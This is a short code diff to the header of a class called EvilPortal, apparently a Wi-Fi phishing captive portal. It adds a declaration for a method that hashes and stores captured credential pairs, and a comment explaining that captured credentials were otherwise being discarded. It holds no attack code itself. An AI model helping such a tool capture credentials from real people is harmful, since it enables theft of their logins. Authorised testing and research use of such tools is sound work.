@@ -262,6 +262,10 @@ class EvilPortal {
     bool management_active = false;
     void startManagementPortal();
     void mainManagement();           // service web server every loop() pass
+    // Hash and persist a completed credential pair. Extracted from main() so
+    // mainManagement() can run it too: main() is not dispatched in this build,
+    // which left captured credentials sitting in RAM and discarded.
+    void flushCapturedCreds();
 
 };
 
